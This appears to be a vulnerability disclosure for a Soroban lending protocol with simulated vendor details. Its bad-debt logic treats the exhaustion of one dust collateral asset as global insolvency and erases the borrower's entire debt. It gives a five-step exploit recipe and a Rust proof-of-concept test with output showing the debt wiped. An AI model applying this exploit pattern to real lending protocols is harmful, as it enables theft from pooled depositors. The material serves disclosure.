Disclosure: Educational abstraction. Vendor details simulated. Logic flaw and economic impact remain 1:1.
[CRITICAL] Isolated Collateral Exhaustion (Global Debt Erasure)
Author: Ayoub Aragui (aragui99)
Category: Economic Invariant Breach
Language: Rust (Soroban)
Context & Invariant
In multi-collateral lending, bad debt socialization must strictly correlate with absolute global insolvency.
Invariant: Debt forgiveness can only occur if the user's Total Collateral Base (across ALL active reserves) is insufficient to cover the borrowed assets.
The Flaw
There is a critical flaw in the bad debt socialization engine. During liquidation, if the targeted asset to be seized exceeds the user's specific balance for that single asset, the protocol sets a localized flag (is_collateral_exhausted).
The post-burn state mutation erroneously treats this localized flag as global bankruptcy. It unconditionally socializes the debt and sets remaining_debt_balance = 0. It completely ignores the user's active configuration bitmap for other well-funded reserves.
The Exploit
An attacker bypasses standard liquidation constraints using a 3-reserve topology:
1.	Supply massive volume of Asset A.
2.	Supply "dust" volume of Asset C.
3.	Borrow heavily in Asset B against Asset A.
4.	Wait for market volatility to drop HF < 1.0.
5.	Liquidate (via secondary wallet) targeting the dust Asset C.
Impact: The protocol seizes the dust, assumes global bankruptcy, and wipes the massive Asset B debt. The attacker walks away with their massive Asset A collateral untouched.
PoC (Execution & Economic Proof)


#[test]
fn test_aragui99_debt_wipeout() {
    use soroban_sdk::{Env, Symbol, IntoVal, vec};
    let env = Env::default();
    
    // Note: Auth mocked strictly for isolated state-machine testing. Standard token allowances are assumed met.
    env.mock_all_auths(); 
    
    let (pool, oracle, user, liq, asset_a, asset_b, asset_c) = abstract_protocol_setup(&env);

    // Setup topology
    pool.supply(&user, &asset_a, &10_000_000_000); // Massive collateral
    pool.supply(&user, &asset_c, &2_000);          // Dust collateral
    pool.borrow(&user, &asset_b, &7_400_000_000);  // Massive debt

    let init_data = pool.get_account_data(&user);
    std::println!("[*] aragui99 - Init Debt: {} | Init HF: {}", init_data.total_debt, init_data.health_factor);

    // Force HF < 1.0
    oracle.mock_price_drop(&asset_a, 85_000_000_000_000);
    oracle.mock_price_pump(&asset_b, 115_000_000_000_000);

    // Exploit: Liquidate targeting dust
    let liq_bal_before = asset_b.balance(&liq);
    
    let res = env.try_invoke_contract::<(), soroban_sdk::Error>(
        &pool.address, &Symbol::new(&env, "liquidate_position"),
        vec![&env, liq.into_val(&env), asset_c.into_val(&env), asset_b.into_val(&env), user.into_val(&env), (1_000_000_000u128).into_val(&env)]
    );
    
    let liq_bal_after = asset_b.balance(&liq);

    let final_data = pool.get_account_data(&user);
    std::println!("[*] aragui99 - Remaining Collateral: {}", final_data.total_collateral);
    std::println!("[!] aragui99 - Liquidator Paid: {}", liq_bal_before - liq_bal_after);
    std::println!("[!] aragui99 - Post-Liquidation Debt: {}", final_data.total_debt);

    assert!(res.is_ok(), "Liquidation failed");
    assert_eq!(final_data.total_debt, 0, "Debt not wiped");
}


[*] aragui99 - Init Debt: 740000000000000000000 | Init HF: 1148648878378378378
[*] aragui99 - Remaining Collateral: 850000000000000000000
[!] aragui99 - Liquidator Paid: 2000
[!] aragui99 - Post-Liquidation Debt: 0
